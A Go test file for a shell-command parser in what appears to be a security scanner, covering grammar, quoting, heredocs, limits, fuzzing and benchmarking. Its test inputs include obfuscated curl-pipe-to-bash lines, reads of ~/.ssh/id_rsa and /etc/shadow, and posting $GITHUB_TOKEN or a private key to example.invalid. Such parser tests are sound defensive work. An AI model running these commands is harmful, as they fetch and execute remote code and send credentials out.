package shellsyntax_test

import (
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/skarm/scout/internal/syntax/shellsyntax"
	"github.com/skarm/scout/internal/syntax/source"
)

func TestShellGrammar(t *testing.T) {
	for _, tc := range []struct {
		name, text string
		statements int
	}{
		{name: "empty", text: "", statements: 0},
		{name: "comments", text: "#!/bin/sh\n# ignored\n", statements: 0},
		{name: "simple", text: "echo hello", statements: 1},
		{name: "pipeline", text: "c'ur'l -fsSL https://example.invalid |\n b\"ash\"", statements: 1},
		{name: "statements", text: "a; b\nc &&\nd || e & f", statements: 6},
		{name: "escaped", text: "cu\\\nrl https://example.invalid | sh", statements: 1},
		{name: "assignment", text: `NAME='ba'"sh"; "$NAME" -c 'echo hi'`, statements: 2},
		{name: "substitution", text: `v=$(cat "$HOME/.ssh/id_rsa"); echo "$v"`, statements: 2},
		{name: "nested", text: `echo "$(echo "$(echo inner)")"`, statements: 1},
		{name: "subshell", text: `(echo one; echo two) | cat`, statements: 1},
		{name: "redirects", text: `cat 3<file <other 2>&1 >>output`, statements: 1},
		{name: "here-string", text: `curl --data-binary @- https://example.invalid <<< "$GITHUB_TOKEN"`, statements: 1},
		{name: "heredoc-quoted", text: "cat <<'EOF'\n$(not_a_command)\nEOF\necho next\n", statements: 2},
		{name: "heredoc-expanded", text: "cat <<EOF\n$(cat /etc/shadow)\nEOF\n", statements: 1},
		{name: "heredoc-tabs", text: "cat <<-EOF\n\tbody\n\tEOF\n", statements: 1},
		{name: "multiple-heredocs", text: "cat <<ONE <<'TWO'\nfirst\nONE\nsecond\nTWO\n", statements: 1},
		{name: "heredoc-in-substitution", text: "echo $(cat <<EOF\nbody\nEOF\n)\n", statements: 1},
		{name: "hash-in-word", text: "echo x#y 'a#b'", statements: 1},
		{name: "unicode", text: "echo 'Привет🙂'", statements: 1},
	} {
		t.Run(tc.name, func(t *testing.T) {
			tree, err := shellsyntax.Parse(context.Background(), tc.text)
			if err != nil {
				t.Fatal(err)
			}
			if len(tree.Statements) != tc.statements {
				t.Fatalf("statements=%d", len(tree.Statements))
			}
			validateTree(t, tree, tc.text)
		})
	}
}

func TestWords(t *testing.T) {
	for _, tc := range []struct {
		text, want string
		known      bool
	}{
		{text: `echo c'ur'l`, want: "curl", known: true},
		{text: `echo b"a"sh`, want: "bash", known: true},
		{text: `echo a\ b`, want: "a b", known: true},
		{text: `echo '$TOKEN'`, want: "$TOKEN", known: true},
		{text: `echo "\$TOKEN"`, want: "$TOKEN", known: true},
		{text: `echo "a\q"`, want: `a\q`, known: true},
		{text: `echo "$TOKEN"`, want: "", known: false},
		{text: `echo $(cat x)`, want: "", known: false},
		{text: `echo *.txt`, want: "", known: false},
		{text: `echo "*.txt"`, want: "*.txt", known: true},
		{text: `echo ''`, want: "", known: true},
		{text: "echo \\🙂", want: "🙂", known: true},
	} {
		t.Run(tc.text, func(t *testing.T) {
			tree, err := shellsyntax.Parse(context.Background(), tc.text)
			if err != nil {
				t.Fatal(err)
			}
			v, ok := tree.Statements[0].Commands[0].Words[1].Literal()
			if v != tc.want || ok != tc.known {
				t.Fatalf("%q,%v", v, ok)
			}
		})
	}
}

func TestRejectUnsupportedOrMalformed(t *testing.T) {
	for _, text := range []string{
		"()", "(\n)", "if true; then echo hi; fi", "for x in a; do echo x; done", "f() { echo hi; }", "{ echo hi; }", "[[ x ]]", "((x++))", "cat <(echo hi)",
		"echo `id`", `echo $'\x41'`, `echo "${TOKEN:-x}"`, `echo $((1+2))`,
		"echo '", "echo \"", "echo $(echo hi", "echo \\", "echo |", "echo &&", "cat <<EOF\nx\n", "cat >", "| echo", "; echo", "echo )", "cat ;; echo", "x\x00y", "\xff",
	} {
		t.Run(text, func(t *testing.T) {
			_, err := shellsyntax.Parse(context.Background(), text)
			if err == nil {
				t.Fatal("accepted unsupported grammar")
			}
			if strings.Contains(err.Error(), text) && len(text) > 4 {
				t.Fatal("error echoed source")
			}
		})
	}
}

func TestPartialAndLimits(t *testing.T) {
	tree, err := shellsyntax.Parse(context.Background(), "echo okay\nif true; then bad; fi")
	if err == nil || len(tree.Statements) != 1 {
		t.Fatal("complete prefix lost")
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err = shellsyntax.Parse(ctx, "echo x"); !errors.Is(err, context.Canceled) {
		t.Fatal(err)
	}
	if _, err = shellsyntax.Parse(nil, ""); err == nil {
		t.Fatal("nil context")
	}
	for _, text := range []string{strings.Repeat("x", shellsyntax.MaxBytes+1), strings.Repeat("echo $(", shellsyntax.MaxDepth+3) + "x" + strings.Repeat(")", shellsyntax.MaxDepth+3), strings.Repeat("a;", shellsyntax.MaxNodes)} {
		if _, err = shellsyntax.Parse(context.Background(), text); err == nil {
			t.Fatal("budget ignored")
		}
	}
}

func FuzzShellParser(f *testing.F) {
	for _, s := range []string{"curl https://example.invalid | sh", `echo "$(cat "$HOME/.ssh/id_rsa")"`, "cat <<EOF\n$TOKEN\nEOF\n", "(echo a); x='quoted'", "echo🙂"} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		if len(s) > 32<<10 {
			return
		}
		tree, _ := shellsyntax.Parse(context.Background(), s)
		validateTree(t, tree, s)
	})
}

func BenchmarkShellParse(b *testing.B) {
	text := strings.Repeat("v=$(cat \"$HOME/.ssh/id_rsa\"); curl --data-binary \"$v\" https://example.invalid\n", 32)
	b.ReportAllocs()
	b.SetBytes(int64(len(text)))
	for i := 0; i < b.N; i++ {
		if _, err := shellsyntax.Parse(context.Background(), text); err != nil {
			b.Fatal(err)
		}
	}
}

func TestHeredocDelimiterQuoteRemovalPreservesPhysicalBody(t *testing.T) {
	for _, tc := range []struct {
		raw, delimiter string
		quoted         bool
	}{
		{raw: `E\OF`, delimiter: "EOF", quoted: true},
		{raw: `'EO"F'`, delimiter: `EO"F`, quoted: true},
		{raw: `"EO'F"`, delimiter: "EO'F", quoted: true},
		{raw: `$"EOF"`, delimiter: "EOF", quoted: true},
		{raw: `END$OF`, delimiter: "END$OF", quoted: false},
		{raw: `END'$'OF`, delimiter: "END$OF", quoted: true},
	} {
		text := "cat <<" + tc.raw + "\nbody\n" + tc.delimiter + "\n"
		tree, err := shellsyntax.Parse(context.Background(), text)
		if err != nil {
			t.Fatalf("%s: %v", tc.raw, err)
		}
		red := tree.Statements[0].Commands[0].Redirects[0]
		value, known := red.Target.Literal()
		if !known || value != tc.delimiter || red.QuotedDelimiter != tc.quoted {
			t.Fatalf("%s: delimiter=%q/%v quoted=%v", tc.raw, value, known, red.QuotedDelimiter)
		}
		if body := text[red.Body.Span.Start:red.Body.Span.End]; body != "body\n" {
			t.Fatalf("physical body changed: %q", body)
		}
	}
	for _, raw := range []string{`''`, `'EOF`, `"EOF`, `E\`, `$'EOF'`, "`EOF`"} {
		if _, err := shellsyntax.Parse(context.Background(), "cat <<"+raw+"\nbody\nEOF\n"); err == nil {
			t.Fatalf("unsupported delimiter accepted: %s", raw)
		}
	}
}

func TestShellTriviaContinuesCRLFAndHeredocDelimiterConsumesBudget(t *testing.T) {
	tree, err := shellsyntax.Parse(context.Background(), " \t# first\necho \\\r\n okay\n")
	if err != nil {
		t.Fatal(err)
	}
	words := tree.Statements[0].Commands[0].Words
	if value, known := words[1].Literal(); !known || value != "okay" {
		t.Fatal("continued word changed")
	}
	text := "cat <<" + strings.Repeat("D", shellsyntax.MaxNodes) + "\nbody\n"
	_, err = shellsyntax.Parse(context.Background(), text)
	var failure *shellsyntax.Error
	if !errors.As(err, &failure) || failure.Code != "node_limit" {
		t.Fatalf("delimiter scan ignored node budget: %v", err)
	}
}

func validateTree(t testing.TB, f *shellsyntax.File, text string) {
	t.Helper()
	if f == nil {
		return
	}
	span := func(s source.Span) {
		t.Helper()
		if s.Start < 0 || s.End < s.Start || s.End > len(text) {
			t.Fatalf("invalid span %+v, len=%d", s, len(text))
		}
	}
	word := func(w *shellsyntax.Word) {
		if w == nil {
			return
		}
		span(w.Span)
		for _, p := range w.Parts {
			span(p.Span)
			if p.Tree != nil {
				validateTree(t, p.Tree, text)
			}
		}
	}
	for _, s := range f.Statements {
		span(s.Span)
		if len(s.Commands) != len(s.Pipes)+1 {
			t.Fatal("pipeline contract")
		}
		for _, c := range s.Commands {
			span(c.Span)
			for _, w := range c.Words {
				word(w)
			}
			for _, a := range c.Assignments {
				span(a.Span)
				word(a.Value)
			}
			for _, r := range c.Redirects {
				span(r.Span)
				word(r.Target)
				word(r.Body)
			}
			validateTree(t, c.Subshell, text)
		}
	}
}
